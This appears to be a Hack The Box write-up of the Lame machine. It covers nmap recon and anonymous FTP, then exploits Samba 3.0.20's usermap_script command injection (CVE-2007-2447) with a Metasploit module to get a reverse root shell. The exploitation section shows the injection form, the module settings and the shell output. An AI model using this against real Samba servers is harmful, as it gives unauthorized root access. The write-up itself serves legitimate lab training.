---
title: Lame
summary: Hack The Box Linux machine running an ancient Samba 3.0.20, exploited through the usermap_script command injection (CVE-2007-2447) for a direct root shell.
date: 2026-10-20
tags: [Hack The Box, Samba, CVE-2007-2447, Metasploit, RCE]
difficulty: easy
os: Linux
url: https://app.hackthebox.com/machines/Lame
---

# CTF Room: Lame
- [Link to machine](https://app.hackthebox.com/machines/Lame)
- **Difficulty:** Easy
- **Category:** RCE
- **OS:** Linux

## 1. Brief
Lame is an old box, and it earns the name. It runs a Samba 3.0.20 that is vulnerable to CVE-2007-2447, a command injection in the `usermap_script` option. There is no privilege escalation to do here, the Samba service runs as root, so exploiting it drops me straight into a root shell and both flags are mine.

---

## 2. Recon

### NMAP Scan
First a quick port scan. I pass `-Pn` because the box does not answer pings.

```bash
nmap machine_ip -Pn
```
```text
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Four ports: FTP, SSH, and SMB on 139/445. Now version and script detection on those:

```bash
nmap -sVC -Pn -p21,22,139,445 machine_ip
```
```text
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux
```

Three things stand out, all ancient:

- **vsftpd 2.3.4** with anonymous login allowed. This version is famous for a backdoor, but that is a known rabbit hole on Lame (the backdoor is not present here).
- **OpenSSH 4.7p1**.
- **Samba 3.0.20-Debian** on 445. This is the interesting one.

### FTP
Anonymous FTP is open, so I logged in to see what was there.

```bash
ftp machine_ip
```
```text
Name (machine_ip:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
```

The share is empty, and vsftpd 2.3.4 does not bite here, so FTP is a dead end. Back to Samba.

---

## 3. Exploitation - Samba usermap_script (CVE-2007-2447)

The quickest way to a known bug is to take the exact service version to Metasploit. I searched for the Samba version in `msfconsole` and it pointed me at `exploit/multi/samba/usermap_script`.

CVE-2007-2447 is a command injection in Samba 3.0.0 through 3.0.25rc3. When the `username map script` option is set, Samba passes the username through a shell without sanitising it, so shell metacharacters in the username (for example `/=\`nohup <command>\``) are executed on the server. Samba runs as root, so the injected command runs as root too. No authentication is needed.

I set the options: `RHOSTS` is the target, `LHOST` is my own IP for the reverse shell.

```text
msf exploit(multi/samba/usermap_script) >> set RHOSTS machine_ip
msf exploit(multi/samba/usermap_script) >> set LHOST your_ip
msf exploit(multi/samba/usermap_script) >> run

[*] Started reverse TCP handler on your_ip:4444
[*] Command shell session 1 opened (your_ip:4444 -> machine_ip:45050)
```

The session opens as root straight away. I dropped into an interactive shell and both flags were readable.

```text
root@lame:/# cat /home/makis/user.txt
||b9eeb776514f1885****************||
root@lame:/# cat /root/root.txt
||195afa37ade4268a****************||
```

---

## 4. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||b9eeb776514f1885****************||` |
| Root flag | `||195afa37ade4268a****************||` |

---

## 5. Summary
Lame is the simplest kind of box: find the ancient service, match it to its CVE, fire the module.

- **Version to CVE.** Samba 3.0.20 sitting on 445 is the whole box. Feeding that version into Metasploit found `usermap_script` (CVE-2007-2447), a pre-auth command injection through an unsanitised username.
- **No privesc needed.** Samba runs as root, so the injected command lands a root shell directly. Both the user and root flags come from the same session.
- The vsftpd 2.3.4 and open anonymous FTP are a deliberate distraction, worth ruling out but not the way in.

**Tools used:** `nmap`, `ftp`, `metasploit` (`exploit/multi/samba/usermap_script`).
